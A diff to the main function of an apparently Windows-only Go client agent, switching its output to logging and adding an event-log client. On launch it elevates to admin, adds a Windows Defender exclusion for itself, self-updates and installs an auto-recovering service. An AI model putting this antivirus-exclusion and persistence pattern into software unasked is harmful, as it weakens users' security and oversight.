@@ -1,7 +1,7 @@
 package main
 
 import (
-	"fmt"
+	"log"
 	"os"
 	"runtime"
 	"strings"
@@ -15,27 +15,35 @@ var version string = "v0"
 
 var BaseURL string = "http://localhost:8080"
 
+var localDebug bool = false
+
 func main() {
 	if runtime.GOOS != "windows" {
-		fmt.Println("This code is specific to Windows to interact with PowerShell.")
+		log.Fatalln("This code is specific to Windows.")
 		return
 	}
+
+	srcPath, _ := os.Executable()
+	localDebug = strings.Contains(srcPath, "go-build")
 
 	if inService, _ := svc.IsWindowsService(); inService {
 		runService(svcName, false)
 		return
 	}
 
-	fmt.Println(becomeAdmin())
-	fmt.Println(defenderExclude(svcName))
-	fmt.Println(update())
-	fmt.Println(installService(svcName, svcDisplayName))
-	fmt.Println(verifyExecuteServicePath(svcName))
-	fmt.Println(verifyRecoveryService(svcName))
-	fmt.Println(startService(svcName))
+	log.Println(becomeAdmin())
+	log.Println(defenderExclude(svcName))
+	log.Println(update())
+	log.Println(installService(svcName, svcDisplayName))
+	log.Println(verifyExecuteServicePath(svcName))
+	log.Println(verifyRecoveryService(svcName))
+	log.Println(startService(svcName))
+
+	elogClientCloser, _ := InitElogClient()
+	defer func() { _ = elogClientCloser() }()
 
 	if err := ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED); err != nil {
-		fmt.Printf("Failed to initialize OLE: %v", err)
+		failed("Failed to initialize OLE: %v", err)
 		return
 	}
 	defer ole.CoUninitialize()
@@ -43,8 +51,4 @@ func main() {
 	go handleUpdateClientStatus("client")
 
 	ui()
-
-	if srcPath, _ := os.Executable(); strings.Contains(srcPath, "go-build") {
-		_ = removeService(svcName)
-	}
 }
